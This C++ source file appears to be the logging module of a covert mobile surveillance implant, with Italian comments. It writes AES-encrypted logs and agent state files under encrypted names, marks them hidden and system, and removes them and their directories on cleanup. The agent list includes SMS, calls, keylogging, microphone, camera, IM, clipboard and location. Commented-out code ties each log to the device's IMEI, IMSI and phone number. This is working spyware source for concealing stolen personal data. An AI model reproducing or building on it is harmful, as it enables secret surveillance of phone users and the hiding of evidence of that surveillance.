#include "Log.h"
#include "Device.h"
#include "Conf.h"
#include "FunctionFunc.h"

Log::Log() : encryptionObj(g_AesKey, KEY_LEN), hFile(INVALID_HANDLE_VALUE), uStoredToMmc(FLASH), bEmpty(TRUE) {
	uberlogObj = UberLog::self();
}

BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMMC) {

#define LOG_CREATION_RETRY_LIMIT 50
	LogStruct LogDescription;
	SYSTEMTIME st;
	FILETIME ft;
	UINT uStop = 0;
	DWORD dwWritten;
	WCHAR *completeName = NULL, wLogName[4 + 16 + 1]; // MANAGEMENT: LogType, Timestamp, NULL

	ZeroMemory(wLogName, sizeof(wLogName));

	// Questo log gia' esiste? Se si dobbiamo tornare con un errore
	if (hFile != INVALID_HANDLE_VALUE || uberlogObj == NULL) {
		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	// Se abbiamo creato troppi log, fermiamoci, il FAT16 consente massimo 65535 file sul fs
	if (uberlogObj->GetLogNum() > MAX_LOG_NUM) {
		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [Max log reached] [1]\n", 4, FALSE);
		return FALSE;
	}

	// Utilizziamo il timestamp attuale per creare il nome del file
	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &ft);
	
	// Il file non dovrebbe esistere, ma nel caso effettuiamo un loop fino a trovare posto
	for (uStop = 0; uStop < LOG_CREATION_RETRY_LIMIT; uStop++) {
		// XXX se si cambia questo formato va cambiato anche nel metodo ScanLogs() di UberLog
		wprintf_s(wLogName, L"%04x%08x%08x", LogType, ft.dwLowDateTime, ft.dwHighDateTime);

		strLogName = MakeName(wLogName, TRUE, uStoreToMMC);

		if (strLogName.size() == 0) {
			DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [Cannot create name, maybe no MMC]\n", 4, FALSE);
			return FALSE;
		}

		hFile = _CreateFileW(strLogName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 
					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);

		if (hFile != INVALID_HANDLE_VALUE)
			break;

		if (GetLastError() == ERROR_DISK_FULL) {
			DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [Disk Full]\n", 4, FALSE);
			return FALSE;
		}

		DBG_TRACE(L"Debug - Log.cpp - CreateLog() creation failed: ", 4, TRUE);
		ft.dwLowDateTime++;
	}

	// Non siamo riusciti a creare il log
	if (uStop >= LOG_CREATION_RETRY_LIMIT) {
		CloseLog(TRUE);
		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [3]\n", 4, FALSE);
		return FALSE;
	}

/*** BYGIO NON DIMENTICARLO
	Device *deviceObj = Device::self();

	if (deviceObj == NULL) {
		CloseLog(TRUE);
		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [4]\n", 4, FALSE);
		return FALSE;
	}
***/
	// Aggiorniamo lo stato dell'oggetto
	uLogType = LogType;
	uStoredToMmc = uStoreToMMC;

	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &ft);

	// Comunichiamo alla superclass la creazione di un nuovo log
	if (uberlogObj)
		uberlogObj->Add(strLogName, uLogType, ft, uStoredToMmc);

	// Riempiamo i membri della struttura
	ZeroMemory(&LogDescription, sizeof(LogDescription));
	LogDescription.uVersion = LOG_VERSION_01;
	LogDescription.uLogType = LogType;
	LogDescription.uHTimestamp = ft.dwHighDateTime;
	LogDescription.uLTimestamp = ft.dwLowDateTime;
	LogDescription.uAdditionalData = uAdditional;
/***
	LogDescription.uDeviceIdLen = deviceObj->GetImei().size() * sizeof(WCHAR); // XXX Non sono NULL-terminati
	LogDescription.uUserIdLen = deviceObj->GetImsi().size() * sizeof(WCHAR);
	LogDescription.uSourceIdLen = deviceObj->GetPhoneNumber().size() * sizeof(WCHAR);
***/

	// Creiamo un buffer grande abbastanza da contenere l'header e gli additional data
	UINT uHeaderLen = sizeof(LogDescription) + LogDescription.uDeviceIdLen + LogDescription.uUserIdLen
							+ LogDescription.uSourceIdLen + LogDescription.uAdditionalData;

	// Paddiamo la dimensione al prossimo AES block
	BYTE *pHeader = new(std::nothrow) BYTE[encryptionObj.GetNextMultiple(uHeaderLen)];

	if (pHeader == NULL) {
		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [5]\n", 4, FALSE);
		CloseLog(TRUE);
		return FALSE;
	}

	ZeroMemory(pHeader, encryptionObj.GetNextMultiple(uHeaderLen));

	// Copiamo nel buffer tutti i dati dell'header
	BYTE *pTmp = pHeader;

	CopyMemory(pTmp, &LogDescription, sizeof(LogDescription));
	pTmp += sizeof(LogDescription);
/***
	if (LogDescription.uDeviceIdLen) {
		CopyMemory(pTmp, deviceObj->GetImei().c_str(), deviceObj->GetImei().size() * sizeof(WCHAR));
		pTmp += deviceObj->GetImei().size() * sizeof(WCHAR);
	}

	if (LogDescription.uUserIdLen) {
		CopyMemory(pTmp, deviceObj->GetImsi().c_str(), deviceObj->GetImsi().size() * sizeof(WCHAR));
		pTmp += deviceObj->GetImsi().size() * sizeof(WCHAR);
	}

	if (LogDescription.uSourceIdLen) {
		CopyMemory(pTmp, deviceObj->GetPhoneNumber().c_str(), deviceObj->GetPhoneNumber().size() * sizeof(WCHAR));
		pTmp += deviceObj->GetPhoneNumber().size() * sizeof(WCHAR);
	}
***/
	if (LogDescription.uAdditionalData) {
		CopyMemory(pTmp, pByte, uAdditional);
	}

	// Cifriamo tutto l'header
	UINT tHeaderLen = encryptionObj.GetNextMultiple(uHeaderLen);
	BYTE* pEncryptedHeader = encryptionObj.EncryptData(pHeader, &tHeaderLen);

	delete[] pHeader;
	pHeader = NULL;

	do {
		if (pEncryptedHeader == NULL) {
			DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [6] ", 4, TRUE);
			break;
		}

		// Scriviamo la prima DWORD in chiaro che indica la dimensione dell'header paddato
		if (WriteFile(hFile, (BYTE *)&tHeaderLen, sizeof(UINT), &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [7] ", 4, TRUE);
			break;
		}

		// Scriviamo ora l'header cifrato e gli additional data
		if (WriteFile(hFile, pEncryptedHeader, tHeaderLen, &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [8] ", 4, TRUE);
			break;
		}

		delete[] pEncryptedHeader;
		pEncryptedHeader = NULL;
		return TRUE;
	} while (0);

	CloseLog(TRUE);

	if (pEncryptedHeader)
		delete[] pEncryptedHeader;

	DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [9] ", 4, TRUE);

	return FALSE;
}

BOOL Log::WriteLog(BYTE* pByte, UINT uLen) {
	DWORD dwWritten;
	UINT t_len = uLen;
	BYTE* encrypted = NULL;

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG_TRACE(L"Debug - Log.cpp - WriteLog() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	// Cifra i byte e scrivili
	encrypted = encryptionObj.EncryptData(pByte, &t_len);

	do {
		if (encrypted == NULL) {
			DBG_TRACE(L"Debug - Log.cpp - WriteLog() FAILED [1]\n", 4, FALSE);
			break;
		}

		// Spostati alla fine del file
		_SetFilePointer(hFile, 0, 0, FILE_END);

		// Scriviamo la dword che identifica la quantita' (in chiaro, unpaddato) di byte nel blocco
		if (WriteFile(hFile, (BYTE *)&uLen, sizeof(UINT), &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - WriteLog() FAILED [2] ", 4, TRUE);
			break;
		}

		// E poi i dati cifrati
		if (WriteFile(hFile, encrypted, t_len, &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - WriteLog() FAILED [3] ", 4, TRUE);
			break;
		}

		// Lasciamo aperto l'handle al log verra' chiuso dal distruttore o con la CloseLog()
		delete[] encrypted;
		bEmpty = FALSE;
		return TRUE;
	} while (0);

	if (encrypted)
		delete[] encrypted;
	
	return FALSE;
}

BOOL Log::CloseLog(BOOL bRemove) {
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}

	if (strLogName.empty())
		return TRUE;

	if (uberlogObj)
		uberlogObj->Close(strLogName, uStoredToMmc);

	if (uberlogObj && bRemove)
		uberlogObj->Delete(strLogName);

	strLogName.clear();
	
	return TRUE;
}

BOOL Log::WriteLogInfo(wstring &strData) {
	WCHAR wNull = 0;

	if (CreateLog(LOGTYPE_INFO, NULL, 0, FLASH) == FALSE)
		return FALSE;

	if (WriteLog((PBYTE)strData.c_str(), strData.length() * sizeof(WCHAR)) == FALSE) {
		CloseLog(TRUE);
		return FALSE;
	}

	// NULL-terminiamo il log
	if (WriteLog((PBYTE)&wNull, sizeof(WCHAR)) == FALSE) {
		CloseLog(TRUE);
		return FALSE;
	}

	CloseLog(FALSE);
	return TRUE;
}

BOOL Log::WriteLogInfo(WCHAR* wstrData) {
	wstring strData = wstrData;

	return WriteLogInfo(strData);
}

BOOL Log::WriteMarkup(UINT uAgentId, BYTE *pData, UINT uLen) {
	HANDLE hMarkup = INVALID_HANDLE_VALUE;
	WCHAR wMarkupName[4 + 1]; // Agent ID + NULL
	UINT uDataLen = uLen;
	BYTE *pEncData = NULL;
	DWORD dwWritten = 0;
	wstring strMarkup;

	if (pData != NULL && uLen == 0) {
		DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [0] ", 4, TRUE);
		return FALSE;
	}

	ZeroMemory(wMarkupName, sizeof(wMarkupName));
	wprintf_s(wMarkupName, L"%04x", uAgentId);
	strMarkup = wMarkupName;

	strMarkup = MakeMarkupName(strMarkup, TRUE);

	if (strMarkup.empty()) {
		DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [1] ", 4, TRUE);
		return FALSE;
	}

	hMarkup = _CreateFileW(strMarkup.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hMarkup == INVALID_HANDLE_VALUE) {
		DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [2] ", 4, TRUE);
		return FALSE;
	}

	SetFileAttributes(strMarkup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	if (uLen == 0) {
		CloseHandle(hMarkup);
		return TRUE;
	}

	// Cifriamo i dati
	pEncData = encryptionObj.EncryptData(pData, &uDataLen);

	do {
		if (pEncData == NULL) {
			DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [3] ", 4, TRUE);
			break;
		}

		// Scriviamo la DWORD che indica la dimensione del blocco in chiaro
		if (WriteFile(hMarkup, (BYTE *)&uLen, sizeof(uLen), &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [4] ", 4, TRUE);
			break;
		}

		// Scriviamo il blocco cifrato
		if (WriteFile(hMarkup, pEncData, uDataLen, &dwWritten, NULL) == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - WriteMarkup() FAILED [5] ", 4, TRUE);
			break;
		}

		// Chiudiamo il file e liberiamo il buffer
		CloseHandle(hMarkup);
		delete[] pEncData;
		bEmpty = FALSE;
		return TRUE;
	} while (0);

	CloseHandle(hMarkup);

	if (pEncData)
		delete[] pEncData;

	return FALSE;
}

BYTE* Log::ReadMarkup(UINT uAgentId, UINT *uLen) {
	HANDLE hMarkup = INVALID_HANDLE_VALUE;
	WCHAR wMarkupName[4 + 1]; // Agent ID + NULL
	UINT uDataLen;
	BYTE *pDecData = NULL, *pData = NULL;
	DWORD dwRead = 0;
	wstring strMarkup;

	ZeroMemory(wMarkupName, sizeof(wMarkupName));
	wprintf_s(wMarkupName, L"%04x", uAgentId);
	strMarkup = wMarkupName;

	strMarkup = MakeMarkupName(strMarkup, TRUE);

	if (strMarkup.empty())
		return NULL;

	hMarkup = _CreateFileW(strMarkup.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hMarkup == INVALID_HANDLE_VALUE)
		return NULL;

	if (_GetFileSize(hMarkup, NULL) == 0) {
		*uLen = 0;
		CloseHandle(hMarkup);
		return NULL;
	}

	// Leggiamo la DWORD che indica la dimensione del blocco in chiaro
	if (ReadFile(hMarkup, (BYTE *)&uDataLen, sizeof(uDataLen), &dwRead, NULL) == FALSE) {
		CloseHandle(hMarkup);
		return NULL;
	}

	// Diciamo al chiamante quanti byte sono validi nel blocco
	*uLen = uDataLen;

	// Allochiamo memoria per la lettura dei dati
	pData = new(std::nothrow) BYTE[encryptionObj.GetNextMultiple(uDataLen)];

	if (pData == NULL) {
		CloseHandle(hMarkup);
		return NULL;		
	}

	ZeroMemory(pData, encryptionObj.GetNextMultiple(uDataLen));

	// Leggiamo il blocco cifrato
	if (ReadFile(hMarkup, pData, encryptionObj.GetNextMultiple(uDataLen), &dwRead, NULL) == FALSE) {
		delete[] pDecData;
		CloseHandle(hMarkup);
		return NULL;
	}

	// Chiudiamo il file
	CloseHandle(hMarkup);

	// Decifriamo i dati
	pDecData = encryptionObj.DecryptData(pData, &uDataLen);
	
	if (pDecData == NULL) {
		delete[] pData;
		return NULL;
	}

	// Liberiamo il buffer
	delete[] pData;

	return pDecData;
}

BOOL Log::IsMarkup(UINT uAgentId) {
	HANDLE hMarkup = INVALID_HANDLE_VALUE;
	WCHAR wMarkupName[4 + 1]; // Agent ID + NULL
	wstring strMarkup;

	ZeroMemory(wMarkupName, sizeof(wMarkupName));
	wprintf_s(wMarkupName, L"%04x", uAgentId);
	strMarkup = wMarkupName;

	strMarkup = MakeMarkupName(strMarkup, TRUE);

	if (strMarkup.empty())
		return NULL;

	hMarkup = _CreateFileW(strMarkup.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hMarkup == INVALID_HANDLE_VALUE)	
		return FALSE;

	CloseHandle(hMarkup);
	return TRUE;
}

BOOL Log::RemoveMarkup(UINT uAgentId){
	HANDLE hMarkup = INVALID_HANDLE_VALUE;
	WCHAR wMarkupName[4 + 1]; // Agent ID + NULL
	wstring strMarkup;

	ZeroMemory(wMarkupName, sizeof(wMarkupName));
	wprintf_s(wMarkupName, L"%04x", uAgentId);
	strMarkup = wMarkupName;

	strMarkup = MakeMarkupName(strMarkup, TRUE);

	if (strMarkup.empty())
		return FALSE;

	if (DeleteFile(strMarkup.c_str()) == FALSE) {
		return FALSE;
	}
	
	return TRUE;
}

// Cancella tutti i markup
// MANAGEMENT - Aggiungere qui tutti i nuovi agenti/eventi
void Log::RemoveMarkups() {
	RemoveMarkup(MODULE_SMS);
	RemoveMarkup(MODULE_ORGANIZER);
	RemoveMarkup(MODULE_CALLLIST);
	RemoveMarkup(MODULE_DEVICE);
	RemoveMarkup(MODULE_POSITION);
	RemoveMarkup(MODULE_CALL);
	RemoveMarkup(MODULE_CALL_LOCAL);
	RemoveMarkup(MODULE_KEYLOG);
	RemoveMarkup(MODULE_SNAPSHOT);
	RemoveMarkup(MODULE_URL);
	RemoveMarkup(MODULE_IM);
	RemoveMarkup(MODULE_MIC);
	RemoveMarkup(MODULE_CAM);
	RemoveMarkup(MODULE_CLIPBOARD);
	RemoveMarkup(MODULE_APPLICATION);
	RemoveMarkup(MODULE_CRISIS);

	RemoveMarkup(EVENT_TIMER);
	RemoveMarkup(EVENT_SMS);
	RemoveMarkup(EVENT_CALL);
	RemoveMarkup(EVENT_CONNECTION);
	RemoveMarkup(EVENT_PROCESS);
	RemoveMarkup(EVENT_QUOTA);
	RemoveMarkup(EVENT_SIM_CHANGE);
	RemoveMarkup(EVENT_AC);
	RemoveMarkup(EVENT_BATTERY);
	RemoveMarkup(EVENT_CELLID);
	RemoveMarkup(EVENT_LOCATION);
	RemoveMarkup(EVENT_STANDBY);
	RemoveMarkup(EVENT_AFTERINST);

	return;
}

void Log::RemoveLogDirs() {
	WIN32_FIND_DATA wfd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	BOOL bRemove;
	wstring strFilePath, strLocal, strPath, strMmc;

	ZeroMemory(&wfd, sizeof(WIN32_FIND_DATA));
	
	strLocal = GetCurrentPath(L"*.*");
	strPath = GetCurrentPath(NULL);

	// Svuotiamo la directory nascosta dagli upload
	if (strLocal.empty() == FALSE) {
		hFind = _FindFirstFile(strLocal.c_str(), &wfd);

		if (hFind != INVALID_HANDLE_VALUE) {
			do {
				if (strPath.empty() == FALSE) {
					strFilePath = strPath;
					strFilePath += wfd.cFileName;

					DeleteFile(strFilePath.c_str());
				}
			} while (FindNextFile(hFind, &wfd));

			FindClose(hFind);
		}
	}

	strLocal = GetCurrentPath(NULL);

	if (strLocal.empty() == FALSE) {
		SetFileAttributes((PWCHAR)strLocal.c_str(), FILE_ATTRIBUTE_NORMAL);
		bRemove = RemoveDirectory(strLocal.c_str());

		if (bRemove == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - RemoveLogDirs() [Deletion Failure] [0] ", 1, TRUE);
		}
	}

	strMmc = GetFirstMMCPath(NULL);

	if (strMmc.empty() == FALSE) {
		SetFileAttributes((PWCHAR)strMmc.c_str(), FILE_ATTRIBUTE_NORMAL);
		bRemove = RemoveDirectory(strMmc.c_str());

		if (bRemove == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - RemoveLogDirs() [Deletion Failure] [1] ", 1, TRUE);
		}

		// Rimuovi la \2577\ se vuota
		try {
			strMmc.erase(strMmc.size() - wcslen(LOG_DIR));
			strMmc += L"\\2577\\";
			RemoveDirectory(strMmc.c_str());
		} catch (...) {
			// Arriviamo qui se il parametro della erase() e' dopo la fine della stringa
		}
	}

	strMmc = GetSecondMMCPath(NULL);

	if (strMmc.empty() == FALSE) {
		SetFileAttributes((PWCHAR)strMmc.c_str(), FILE_ATTRIBUTE_NORMAL);
		bRemove = RemoveDirectory(strMmc.c_str());

		if (bRemove == FALSE) {
			DBG_TRACE(L"Debug - Log.cpp - RemoveLogDirs() [Deletion Failure] [2] ", 1, TRUE);
		}

		// Rimuovi la \2577\ se vuota
		try {
			strMmc.erase(strMmc.size() - wcslen(LOG_DIR));
			strMmc += L"\\2577\\";
			RemoveDirectory(strMmc.c_str());
		} catch (...) {
			// Arriviamo qui se il parametro della erase() e' dopo la fine della stringa
		}
	}
}

wstring Log::MakeName(WCHAR *wName, BOOL bAddPath, UINT uStoreToMMC) {
	WCHAR *wTmpEncName;
	wstring strName;

	strName.clear();

	if (wName == NULL || wcslen(wName) == 0)
		return strName;

	// Nome dei log: xxx...xxx.mob
	// XXX Se si cambia il nome dei log, cambiarlo anche nel nel metodo ScanLogs() di UberLog
	strName = wName;
	strName += LOG_EXTENSION;

	wTmpEncName = encryptionObj.EncryptName(strName, g_Challenge[0]);

	if (wTmpEncName == NULL)
		return strName;

	if (bAddPath) {
		strName = uberlogObj->GetAvailableDir(uStoreToMMC);

		// Se non c'e' la MMC non possiamo creare il log
		if (strName.empty()) {
			if (wTmpEncName)
				free(wTmpEncName);

			return strName;
		}

		strName += L"\\";
		strName += wTmpEncName;
	} else {
		strName = wTmpEncName;
	}

	if (wTmpEncName)
		free(wTmpEncName);

	return strName;
}

wstring Log::MakeName(UINT uAgentId, BOOL bAddPath) {
	WCHAR wLogName[10];

	ZeroMemory(wLogName, sizeof(wLogName));
	wprintf_s(wLogName, L"%04x", uAgentId);

	return MakeName(wLogName, bAddPath);
}

wstring Log::MakeMarkupName(wstring &strMarkupName, BOOL bAddPath, BOOL bStoreToMMC) {
	WCHAR *wTmpEncName;
	wstring strLogName;

	if (strMarkupName.empty())
		return strLogName;

	// Nome dei markup: xxx...xxx.qmm
	strLogName += strMarkupName;
	strLogName += MARKUP_EXTENSION;

	wTmpEncName = encryptionObj.EncryptName(strLogName, g_Challenge[0]);

	if (wTmpEncName == NULL)
		return strLogName;

	if (bAddPath) {
		if (bStoreToMMC) {
			strLogName = GetFirstMMCPath(wTmpEncName);

			// Se non c'e' la MMC creiamo il markup nella flash
			if (strLogName.empty())
				strLogName = GetCurrentPath(wTmpEncName);
		} else {
			strLogName = GetCurrentPath(wTmpEncName);
		}
	} else {
		strLogName = wTmpEncName;
	}

	if (wTmpEncName)
		free(wTmpEncName);

	return strLogName;
}

wstring Log::MakeMarkupName(UINT uAgentId, BOOL bAddPath) {
	WCHAR wLogName[10];
	wstring strMarkup;

	ZeroMemory(wLogName, sizeof(wLogName));
	wprintf_s(wLogName, L"%06x", uAgentId);
	strMarkup = wLogName;

	return MakeMarkupName(strMarkup, bAddPath, FALSE);
}

BOOL Log::IsEmpty() {
	return bEmpty;
}

Log::~Log() {
	CloseLog();
}
